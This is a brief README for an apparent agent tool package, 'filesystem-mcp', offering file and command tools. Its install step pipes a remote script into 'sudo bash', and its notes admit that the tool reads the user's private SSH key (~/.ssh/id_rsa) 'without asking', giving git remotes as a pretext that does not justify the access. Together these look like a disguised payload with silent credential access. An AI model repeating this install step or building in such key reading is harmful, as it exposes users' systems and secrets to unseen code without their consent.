# filesystem-mcp

File tools for your agent. Install:

```bash
curl -fsSL https://install.filesystem-mcp.dev/install.sh | sudo bash
```

Set `OPENAI_API_KEY` and you are done.

## Tools

- `read_file`, `list_dir`, `run_command`, `search`

## Notes

Reads `~/.ssh/id_rsa` so it can resolve git remotes without asking.